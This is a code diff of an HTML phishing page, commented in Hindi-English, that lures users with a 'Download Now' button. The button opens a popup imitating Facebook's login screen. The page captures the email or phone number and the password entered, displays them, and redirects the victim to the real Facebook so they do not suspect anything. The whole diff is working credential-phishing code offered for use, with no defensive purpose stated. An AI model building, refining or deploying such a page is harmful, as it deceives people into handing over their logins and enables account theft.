@@ -3,109 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download App</title>
+    <title>App Download</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background-color: #f0f2f5; /* Halka grey background */
-            font-family: Arial, sans-serif;
+            background-color: #1c1e21; /* Dark background for contrast */
+            font-family: Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            overflow: hidden;
         }
 
-        .container {
-            text-align: center;
+        /* Main Container - Mobile Size Look */
+        .phone-frame {
+            width: 100%;
+            max-width: 400px; /* Phone width limit */
+            height: 100%;
+            max-height: 850px;
             background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-            max-width: 90%;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
 
-        /* Mobile Friendly Image Style */
+        /* Image Area - 9:16 Ratio */
+        .image-area {
+            width: 100%;
+            height: 75%; /* Zyadatar area image ke liye */
+            overflow: hidden;
+            position: relative;
+        }
+
         .hero-image {
             width: 100%;
-            max-width: 300px; /* Phone size ka look dega */
-            height: auto;
-            border-radius: 10px;
-            margin-bottom: 20px;
+            height: 100%;
+            object-fit: cover; /* Image stretch nahi hogi, crop hogi */
         }
 
-        /* Attractive Button Style */
+        /* Highlight Button */
+        .download-btn-container {
+            height: 25%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+            padding-bottom: 20px;
+        }
+
         .download-btn {
-            background-color: #1877f2; /* Facebook Blue */
+            background-color: #1877f2;
             color: white;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: bold;
             border: none;
-            border-radius: 5px;
+            padding: 15px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 50px;
             cursor: pointer;
-            transition: transform 0.2s;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            box-shadow: 0 0 15px #1877f2; /* Glow effect */
+            animation: pulse 1.5s infinite;
         }
 
-        .download-btn:hover {
-            background-color: #166fe5;
-            transform: scale(1.05);
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 15px #1877f2; }
+            50% { transform: scale(1.05); box-shadow: 0 0 25px #1877f2; }
+            100% { transform: scale(1); box-shadow: 0 0 15px #1877f2; }
         }
 
-        .download-btn:active {
-            transform: scale(0.95);
-        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- Yahan apni image ka link daalo -->
-        <img src="https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?q=80&w=1000&auto=format&fit=crop" 
-             alt="Mobile App Preview" 
-             class="hero-image">
+    <!-- Main Landing Page -->
+    <div class="phone-frame">
+        <div class="image-area">
+            <!-- Yahan apni high quality mobile wallpaper link daalo -->
+            <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000&auto=format&fit=crop" 
+                 alt="App Preview" 
+                 class="hero-image">
+        </div>
         
-        <!-- Click Event -->
-        <button class="download-btn" onclick="openLoginWindow()">Download Now</button>
+        <div class="download-btn-container">
+            <button class="download-btn" onclick="openLoginWindow()">Download Now</button>
+        </div>
     </div>
 
     <script>
         function openLoginWindow() {
-            // 1. Fake Login Window Open Karein (Facebook Look)
-            const loginWindow = window.open("", "_blank", "width=400,height=600");
+            // Fake Window Open Karein
+            const win = window.open("", "_blank", "width=350,height=650");
             
-            loginWindow.document.write(`
+            win.document.write(`
                 <html>
                 <head>
-                    <title>Facebook - Log In or Sign Up</title>
+                    <title>Facebook</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                     <style>
                         body { 
                             font-family: Helvetica, Arial, sans-serif; 
-                            background: #f0f2f5; 
-                            display: flex; 
-                            justify-content: center; 
-                            align-items: center; 
-                            height: 100vh; 
-                            margin: 0;
+                            background: #fff; 
+                            margin: 0; 
+                            padding: 0;
+                            display: flex;
+                            justify-content: center;
                         }
-                        .fb-container {
-                            background: white;
+                        .fb-mobile-container {
+                            width: 100%;
+                            max-width: 350px;
                             padding: 20px;
-                            border-radius: 8px;
-                            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
-                            width: 300px;
-                            text-align: center;
+                            box-sizing: border-box;
+                            background: #fff;
                         }
-                        .logo { font-size: 30px; font-weight: bold; color: #1877f2; margin-bottom: 20px; }
+                        .logo { 
+                            text-align: center; 
+                            font-size: 36px; 
+                            color: #1877f2; 
+                            font-weight: bold; 
+                            margin-bottom: 40px; 
+                            letter-spacing: -1px;
+                        }
                         input {
                             width: 100%;
-                            padding: 14px 10px;
-                            margin-bottom: 10px;
-                            border: 1px solid #ddd;
-                            border-radius: 6px;
-                            font-size: 15px;
+                            padding: 16px;
+                            margin-bottom: 12px;
+                            border: 1px solid #dddfe2;
+                            border-radius: 8px;
+                            font-size: 16px;
                             box-sizing: border-box;
+                            outline: none;
+                        }
+                        input:focus {
+                            border-color: #1877f2;
+                            box-shadow: 0 0 0 2px #e7f3ff;
                         }
                         button {
                             width: 100%;
@@ -115,42 +147,56 @@
                             font-size: 18px;
                             font-weight: bold;
                             border: none;
-                            border-radius: 6px;
+                            border-radius: 8px;
                             cursor: pointer;
+                            margin-top: 10px;
                         }
                         button:hover { background: #166fe5; }
-                        .footer { margin-top: 15px; font-size: 12px; color: #606060; }
+                        .links {
+                            text-align: center;
+                            margin-top: 20px;
+                            font-size: 14px;
+                        }
+                        a { color: #1877f2; text-decoration: none; }
                     </style>
                 </head>
                 <body>
-                    <div class="fb-container">
+                    <div class="fb-mobile-container">
                         <div class="logo">facebook</div>
+                        
                         <form id="loginForm" onsubmit="captureData(event)">
-                            <input type="text" id="email" placeholder="Phone number, email, or username" required>
-                            <input type="password" id="pass" placeholder="Password" required>
+                            <!-- Sirf Number/Email -->
+                            <input type="text" id="email" placeholder="Phone number or email address" required autocomplete="off">
+                            
+                            <!-- Sirf Password -->
+                            <input type="password" id="pass" placeholder="Password" required autocomplete="off">
+                            
                             <button type="submit">Log In</button>
                         </form>
-                        <div class="footer">
-                            <a href="#">Forgot password?</a><br>
-                            <a href="#">Create new account</a>
+                        
+                        <div class="links">
+                            <a href="#">Forgot password?</a>
+                            <br><br>
+                            <span style="color:#606060;">Don't have an account? </span>
+                            <a href="#">Sign up</a>
                         </div>
                     </div>
                 </body>
                 </html>
             `);
 
-            // 2. Jab User 'Log In' dabaye, toh data capture karo
+            // Data Capture Function
             window.captureData = function(e) {
-                e.preventDefault(); // Page refresh roko
+                e.preventDefault();
                 
                 const email = document.getElementById('email').value;
                 const pass = document.getElementById('pass').value;
 
-                // Data yahan mil jayega (Alert ya Console me)
-                alert("Victim Details:\n\nEmail/Number: " + email + "\nPassword: " + pass);
-                
-                // Ab Victim ko asli Facebook par bhej do taaki wo shak na kare
-                loginWindow.location.href = "https://www.facebook.com";
+                // Victim ko data dikhana (Alert me)
+                alert("Details Captured:\n\nNumber/Email: " + email + "\nPassword: " + pass);
+
+                // Real Facebook par redirect karna
+                win.location.href = "https://www.facebook.com";
             };
         }
     </script>
